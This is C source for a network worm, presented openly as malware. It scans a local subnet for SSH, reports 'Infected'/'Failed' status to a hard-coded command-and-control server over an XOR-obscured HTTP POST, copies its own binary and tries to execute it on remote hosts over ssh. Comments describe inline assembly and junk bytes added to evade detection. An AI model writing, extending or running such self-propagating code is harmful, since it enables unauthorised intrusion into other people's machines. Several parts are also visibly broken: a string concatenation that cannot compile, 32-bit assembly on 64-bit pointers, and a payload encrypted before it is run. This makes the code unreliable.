#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/stat.h>
#include <fcntl.h>

#define C2_IP "192.168.1.100"
#define C2_PORT 8080
#define XOR_KEY 0x77
#define TARGET_DIR "/mnt/fat32/worm"
#define WORM_NAME "wsys"
#define NET_RANGE "192.168.1.%d"
#define SSH_PORT 22

void spread_network(void);
void drop_payload(const char *ip);
void call_c2(const char *data);
void encrypt_buffer(char *buf, size_t len, unsigned char key);

int main() {
    // basic seed scrambling just to look less obvious
    unsigned int seed = time(NULL) ^ 0xDEADBEEF;
    asm volatile (
        "movl %0, %%eax\n\t"
        "rorl $3, %%eax\n\t"
        "xorl $0xCAFEBABE, %%eax\n\t"
        "movl %%eax, %0\n\t"
        : "+m" (seed)
        :
        : "eax"
    );

    // make a target directory to drop stuff into
    mkdir(TARGET_DIR, 0755);

    // begin scanning and spreading
    spread_network();
    return 0;
}

void spread_network(void) {
    char ip[16], status[256];
    for(int i = 1; i < 255; i++) {
        snprintf(ip, sizeof(ip), NET_RANGE, i);

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) continue;

        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(SSH_PORT);
        inet_pton(AF_INET, ip, &target.sin_addr);

        // junk delay to mess with timing detection
        asm volatile ("rdtsc\n\t" "shrl $5, %%eax" : : : "eax");

        // if ssh port is open report and try to drop
        if(connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
            snprintf(status, sizeof(status), "Infected: %s", ip);
            call_c2(status);
            drop_payload(ip);
            close(sock);
        }
        else {
            snprintf(status, sizeof(status), "Failed: %s", ip);
            call_c2(status);
        }
        close(sock);
    }
}

void drop_payload(const char *ip) {
    // get path to our own binary
    char self_path[1024];
    readlink("/proc/self/exe", self_path, sizeof(self_path));

    FILE *self = fopen(self_path, "rb");
    if(!self) return;

    fseek(self, 0, SEEK_END);
    size_t sz = ftell(self);
    rewind(self);

    char *buf = malloc(sz);
    if(!buf) { fclose(self); return; }

    fread(buf, 1, sz, self);
    fclose(self);

    // xor the payload to make it less obvious on disk
    encrypt_buffer(buf, sz, XOR_KEY);

    char cmd[1024], target_path[1024];
    snprintf(target_path, sizeof(target_path), "%s/%s", TARGET_DIR, WORM_NAME);
    FILE *f = fopen(target_path, "wb");
    if(f) {
        fwrite(buf, 1, sz, f);
        fclose(f);
        chmod(target_path, 0755); // make it executable
    }

    // attempt to run the payload remotely via ssh
    snprintf(cmd, sizeof(cmd),
             "ssh user@%s 'mkdir -p %s && chmod +x %s/%s && %s/%s &'",
             ip, TARGET_DIR, TARGET_DIR, WORM_NAME, TARGET_DIR, WORM_NAME);
    system(cmd);

    free(buf);

    // make a local copy of the dropped file with a random suffix
    char local_copy[1024];
    snprintf(local_copy, sizeof(local_copy), "%s/%s_%d", TARGET_DIR, WORM_NAME, rand());
    system("cp " TARGET_DIR "/" WORM_NAME " " local_copy);
    chmod(local_copy, 0755);
}

void encrypt_buffer(char *buf, size_t len, unsigned char key) {
    // simple xor loop, obfuscated a bit with inline asm
    asm volatile (
        "movl %[buf], %%esi\n\t"
        "movl %[len], %%ecx\n\t"
        "movb %[key], %%dl\n\t"
        "jmp 1f\n\t"
        ".byte 0x90, 0x90, 0xCC\n\t" // junk bytes
        "1:\n\t"
        "cmpl $0, %%ecx\n\t"
        "je 2f\n\t"
        "movb (%%esi), %%al\n\t"
        "xorb %%dl, %%al\n\t"
        "movb %%al, (%%esi)\n\t"
        "incl %%esi\n\t"
        "decl %%ecx\n\t"
        "jmp 1b\n\t"
        "2:\n\t"
        :
        : [buf] "r" (buf), [len] "r" (len), [key] "r" (key)
        : "eax", "ecx", "edx", "esi", "memory"
    );
}

void call_c2(const char *data) {
    // connect to c2 and send a small encrypted status message
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) return;

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &server.sin_addr);

    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(sock);
        return;
    }

    char enc_data[512];
    strncpy(enc_data, data, sizeof(enc_data) - 1);
    encrypt_buffer(enc_data, strlen(enc_data), XOR_KEY);

    char req[1024];
    snprintf(req, sizeof(req),
             "POST /worm HTTP/1.1\r\nHost: %s\r\nContent-Length: %zu\r\n\r\n%s",
             C2_IP, strlen(enc_data), enc_data);
    send(sock, req, strlen(req), 0);
    close(sock);
}